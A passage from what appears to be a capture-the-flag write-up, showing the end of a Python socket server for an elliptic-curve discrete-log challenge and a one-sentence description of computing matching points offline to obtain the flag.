        except Exception as e:
            response = json_response(5, ', "Error Message": "%s"' % e)


class Server(asyncore.dispatcher_with_send):

    def __init__(self, host, port):
        asyncore.dispatcher.__init__(self)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind((host, port))
        self.listen(5)
        # variable to store some collision
        self.collision_found = False
        self.collision = {}

    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            sock, addr = pair
            print("incoming connection from %s" % repr(addr))
            DLogHandler(sock)


if __name__ == '__main__':

    load("parameters.sage")
    server = Server(serverAdress, serverPort)
    asyncore.loop()
```
 From the server.py, we just need to find points that satisfy E((x, y)) == c*P + d*Q, from the parameters.sage we have P,Q,we can easily do it offline and send 200 points to server with same groupID, then the server give back the flag.